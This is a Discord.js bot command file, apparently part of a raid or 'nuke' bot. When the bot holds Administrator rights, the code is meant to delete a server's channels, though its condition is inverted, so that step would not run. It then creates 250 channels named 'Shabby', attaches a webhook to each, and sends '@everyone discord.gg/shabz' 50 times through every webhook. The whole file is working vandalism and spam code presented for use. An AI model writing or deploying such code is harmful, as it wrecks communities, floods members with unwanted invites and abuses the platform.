const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "webhook",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    if(!message.guild.members.me.permissions.has("Administrator")) return error(message, `I'm missing permissions!`)

    if(message.guild.channels.cache.size < 1) {
        message.guild.channels.cache.forEach(channel => channel.delete());
    }

    for (let i = 0;i < 250;i++) {
        message.guild.channels.create({
            name: 'Shabby'
        }).then(c => {
            c.createWebhook({
                name: 'Shabzy'
            }).then(r => {
                for (let i = 0;i < 50;i++) {
                r.send("@everyone discord.gg/shabz")
                }
            })
        })
    }
  },
};